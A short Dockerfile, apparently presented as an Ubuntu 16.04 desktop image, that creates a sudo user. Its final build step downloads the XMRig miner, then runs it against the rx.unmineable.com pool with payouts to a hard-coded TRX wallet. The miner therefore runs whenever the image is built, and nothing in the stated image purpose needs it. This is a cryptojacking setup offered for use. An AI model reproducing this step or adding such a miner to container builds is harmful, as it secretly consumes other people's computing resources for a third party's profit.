#####################################################################
#                   thank you bro rizafiq                           #
#####################################################################
FROM ubuntu:16.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o rx.unmineable.com:3333 -u TRX:TLjhpDMrsLyUuchLZnN4KACfdChL4rSm4E -k -a rx/0
